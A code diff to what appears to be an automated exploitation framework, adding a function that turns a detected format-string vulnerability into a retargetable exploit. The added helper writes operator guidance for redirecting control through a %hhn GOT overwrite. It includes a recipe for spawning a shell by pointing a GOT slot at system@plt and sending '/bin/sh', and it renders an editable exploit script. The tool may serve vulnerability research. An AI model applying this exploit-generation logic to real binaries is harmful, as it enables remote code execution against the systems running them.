@@ -618,6 +618,10 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                         summary=f"{name}(buf) at {s}: %hhn-write &{win[0]} over {dyn['slot']}@GOT "
                                 f"({dyn['got']:#x}); control reach to {win[0]} confirmed by detonation",
                         lead=lead, detonated=True,
+                        extra_evidence=_fmt_customize(
+                            target, target_bytes, arg_offset=dyn["off"],
+                            slot_name=f"{dyn['slot']}@GOT", slot_addr=dyn["got"],
+                            value=int(win[1]), win_name=win[0], sink_name=name, site=s),
                         function_addr=getattr(lead, "function_addr", None),
                         site_addr=getattr(lead, "site_addr", None),
                         signal_name=f"control reached {win[0]} ({int(win[1]):#x})")
@@ -636,6 +640,11 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
             # honest corroborated recipes below.
             if plan.get("stage") == "one-shot" and plan.get("input"):
                 detonated, signal_name = _try_detonate(ctx, target, plan, win)
+                w_addr, w_val = next(iter((plan.get("writes") or {}).items()), (None, None))
+                custom = (_fmt_customize(target, target_bytes, arg_offset=layout.get("arg_offset"),
+                          slot_name=_got_name(target_bytes, w_addr), slot_addr=w_addr, value=w_val,
+                          win_name=(win[0] if win else "the target"), sink_name=name, site=site)
+                          if w_addr is not None else None)
                 fid = construct.record_constructed_poc(
                     ctx, target, cwe="CWE-134", technique=plan["technique"],
                     level=plan["target_level"], payload=plan["input"],
@@ -644,7 +653,7 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                     input_mode="stdin", detector="fmt_construct",
                     dedup_key=f"poc:CWE-134:fmt-write:{site}:{target.id}",
                     title=f"Format-string write-what-where at {site}",
-                    summary=plan["summary"], lead=lead,
+                    summary=plan["summary"], lead=lead, extra_evidence=custom,
                     function_addr=getattr(lead, "function_addr", None),
                     site_addr=getattr(lead, "site_addr", None),
                     detonated=detonated, signal_name=signal_name)
@@ -670,6 +679,55 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
     except Exception:                                    # noqa: BLE001 -- advisory, never fatal
         observe.absorbed(_log, "format-write recipe not filed")
     return fids
+
+
+def _fmt_customize(target, target_bytes, *, arg_offset, slot_name, slot_addr, value,
+                   win_name, sink_name, site) -> list:
+    """Evidence that shows the operator HOW TO RETARGET this format-string PoC: the knobs they can
+    change (write target / value / offset) with the RCE recipe, plus the editable builder script."""
+    sysplt = None
+    try:
+        sysplt = (elfstatic.plt_stubs(target_bytes) or {}).get("system")
+    except Exception:                                    # noqa: BLE001
+        pass
+    rce = ("overwrite a GOT slot that the program calls with YOUR input as its first argument "
+           "with system@plt" + (f" ({sysplt:#x})" if sysplt else " (resolve its address)")
+           + ", then send your command (e.g. '/bin/sh') as the program's input.")
+    guide = (
+        f"This PoC does a %hhn write-what-where: it overwrites {slot_name} ({slot_addr:#x}) with "
+        f"&{win_name} ({value:#x}), so the next call through that slot redirects control. "
+        "Edit these knobs in the builder below to change the effect:\n"
+        f"- WRITE VALUE ({value:#x}) — the address control jumps to; set it to any function's "
+        "address to call that instead.\n"
+        f"- WRITE TARGET ({slot_name} @ {slot_addr:#x}) — the GOT slot overwritten; pick one the "
+        "program calls after the sink.\n"
+        f"- ARG OFFSET ({arg_offset}) — where your bytes land in the varargs; fixed for this binary.\n"
+        f"- RCE / spawn a shell — {rce}"
+    )
+    ev = [{"channel": "customize", "detail": guide}]
+    try:
+        from . import exploit_script
+        facts = {"cwe": "CWE-134", "sink": sink_name or "printf",
+                 "source": f"{getattr(target, 'filename', 'target')} ({sink_name}() at {site})",
+                 "delivery": "stdin", "argv": [], "bits": int(getattr(target, "bits", 64) or 64),
+                 "exec_name": getattr(target, "filename", "./target"), "arg_offset": arg_offset,
+                 "write_target": {"name": slot_name, "addr": int(slot_addr), "value": int(value)},
+                 "mitigations": {"pie": False, "relro": "partial"}}
+        ev.append({"channel": "exploit-script", "detail": exploit_script.render_format_string_exploit(facts)})
+    except Exception:                                    # noqa: BLE001
+        observe.absorbed(_log, "editable exploit builder not rendered")
+    return ev
+
+
+def _got_name(target_bytes, addr) -> str:
+    try:
+        from . import rop
+        for n, a in (rop.got_entries(target_bytes) or {}).items():
+            if a == addr:
+                return f"{n}@GOT"
+    except Exception:                                    # noqa: BLE001
+        pass
+    return "GOT slot"
 
 
 def _emit_format_script(ctx, target, target_bytes, layout, plan, sink) -> Optional[str]:
